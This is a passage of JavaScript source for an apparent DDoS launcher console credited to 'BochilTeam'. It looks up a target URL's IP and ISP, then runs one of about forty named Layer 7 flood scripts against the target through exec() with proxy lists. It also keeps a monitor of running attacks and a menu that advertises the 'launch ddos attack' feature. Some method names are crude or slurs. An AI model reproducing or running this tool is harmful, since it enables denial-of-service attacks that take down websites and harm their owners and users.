  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`|Target|Methods|Duration|Since|
|${process.target}|${process.methods}|${process.duration}|${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n|`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇
                          ⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀
⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀
⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆
⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛
⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀
[===============ATTACK WILL BE LAUNCHED===============]
∆Attack Information:
Target   : ${target}
Duration  : ${duration}
Methods  : ${methods}

€Target Detail:
AS       : ${result.as}
Ip       : ${result.query}
ISP      : ${result.isp}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 60 proxy.txt flood`)
	sigma()
  } else if (methods === 'ghostxtls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxstorm') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxbypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'cookie') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxflood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'anus-h2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'boom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10`)
	sigma()
  } else if (methods === 'nuke') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'black') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'pluto') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'xyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'hold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'vxx') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/Xlamper/root-/refs/heads/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By BochilTeam

Thx To:
Wanzz ( Support Methods )
BochilTeam ( Pengembang )
`
permen.question('[\x1b[1m\x1b[31mBochilTeam Tools > Console\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| news         | show news update
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[==================METHODS DDoS==================]
||Total Layer7: 40 Methods || Total Layer4: Coming Soon
§§ flood      || Layer7 (Best Methods)
§§ tls        || Layer7
§§ strike     || Layer7
§§ kill       || Layer7
§§ raw        || Layer7
§§ bypass     || Layer7
§§ thunder    || Layer7 (Best Methods)
§§ storm      || Layer7 (Best Methods)
§§ rape       || Layer7
§§ destroy    || Layer7
§§ slim       || Layer7
§§ skynet-tls || Layer7 (Best Methods)
§§ glory      || Layer7
§§ mixsyn     || Layer7
§§ mix        || Layer7
§§ vxx        || Layer7
§§ geckold    || Layer7
§§ lezkill    || Layer7
§§ tls-vip    || Layer7
§§ tls-bypass || Layer7
§§ killer     || Layer7
§§ black      || Layer7
§§ xlamper    || Layer7
§§ boom       || Layer7
§§ inferno    || Layer7
§§ xlamper-bom|| Layer7 
§§ tornado    || Layer7
§§ tlsv1      || Layer7
§§ medusa     || Layer7
§§ anus-h2    || Layer7
§§ uam        || Layer7
§§ http-x     || Layer7 
§§ ghostxflood|| Layer7 
§§ pluto      || Layer7 
§§ ghostxbypas|| Layer7 
§§ hold       || Layer7 (New)
§§ cookie     || Layer7 (New)
§§ xyn        || Layer7 (New) + (Best Methods)
§§ nuke       || Layer7 (New) + (Best Methods)
§§ pidoras    || Layer7 (New) + (Best Methods)
§§ ghostxglory|| Layer7 (Owner Only)
§§ night-flood|| Layer7 (Owner Only)
§§ night-bypas|| Layer7 (Owner Only)
§§ ghostxtls  || Layer7 (Owner Only)
§§ ghostxstorm|| Layer7 (Owner Only)
[==================METHODS DDoS==================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
